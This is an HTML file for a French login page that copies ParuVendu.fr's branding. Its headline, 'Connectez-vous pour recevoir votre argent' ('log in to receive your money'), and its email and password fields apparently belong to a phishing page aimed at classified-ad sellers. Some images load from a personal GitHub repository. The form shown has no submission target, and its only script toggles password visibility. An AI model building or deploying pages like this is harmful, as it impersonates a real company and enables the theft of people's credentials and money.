<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - ParuVendu.fr</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-image: url('https://github.com/zapata225/lebon/blob/main/paruvendu.png?raw=true');
            background-position: right;
            background-repeat: no-repeat;
            background-size: contain;
        }
        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
        }
        .logo img {
            width: 200px;
        }
        .container {
            width: 25%; /* Largeur du formulaire */
            padding: 30px; /* Padding */
            background: white;
            border-radius: 30px; /* Bords plus enrob√©s */
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            position: absolute;
            top: 30%; /* Hauteur */
            left: 15%; /* D√©plac√© plus √† gauche */
            transform: translateY(-30%);
            animation: slideUp 1s ease-out;
        }
        @keyframes slideUp {
            from {
                transform: translateY(100%);
            }
            to {
                transform: translateY(-30%);
            }
        }
        .form-group {
            margin-bottom: 15px; /* Espacement entre les champs */
            text-align: left;
        }
        input {
            width: 100%; /* Largeur des champs */
            padding: 12px; /* Padding */
            border: 1px solid #ccc;
            border-radius: 0; /* Bordures rectangulaires */
            font-size: 14px;
            transition: all 0.3s;
            background-color: #f9f9f9;
            box-sizing: border-box; /* Assure que la largeur inclut le padding */
        }
        input:focus {
            border-color: #ff4c4c;
            box-shadow: 0 0 5px rgba(255, 76, 76, 0.5);
        }
        .password-container {
            position: relative;
        }
        .password-container input {
            padding-right: 35px; /* Espace pour l'ic√¥ne */
        }
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666;
        }
        .btn {
            background-color: #cc0000; /* Rouge plus fonc√© */
            color: white;
            padding: 8px 20px; /* Taille r√©duite */
            border: none;
            border-radius: 20px;
            cursor: pointer;
            width: 40%; /* Bouton plus petit */
            font-size: 14px; /* Taille du texte */
            transition: background 0.3s;
            text-transform: lowercase; /* Mise en minuscule */
            margin-left: auto;
            margin-right: auto;
            display: block;
            font-weight: bold; /* Texte en gras */
        }
        .btn:hover {
            background-color: #b30000; /* Rouge plus fonc√© au survol */
        }
        .footer-logo {
            position: absolute;
            bottom: 20px;
            width: 50%;
            left: 0;
        }
        .footer-logo img {
            width: 100%;
        }
        .connexion-text {
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            color: #ff4c4c;
            margin-bottom: 20px;
        }
        .form-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-logo img {
            width: 100px; /* Taille du logo */
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="ParuVendu.fr">
    </div>
    <div class="container">
        <div class="connexion-text">Connectez-vous pour recevoir votre argent</div>
        <div class="form-logo">
            <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="Logo Formulaire">
        </div>
        <form>
            <div class="form-group">
                <label for="email">Votre adresse mail</label>
                <input type="email" id="email" required>
            </div>
            <div class="form-group password-container">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" required>
                <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
            </div>
            <button type="submit" class="btn">Continuer</button>
        </form>
    </div>
    <div class="footer-logo">
        <img src="https://github.com/zapata225/lebon/blob/main/paruvendu1.png?raw=true" alt="ParuVendu Footer">
    </div>
    <script>
        function togglePassword() {
            var passwordField = document.getElementById("password");
            passwordField.type = passwordField.type === "password" ? "text" : "password";
        }
    </script>
</body>
</html>
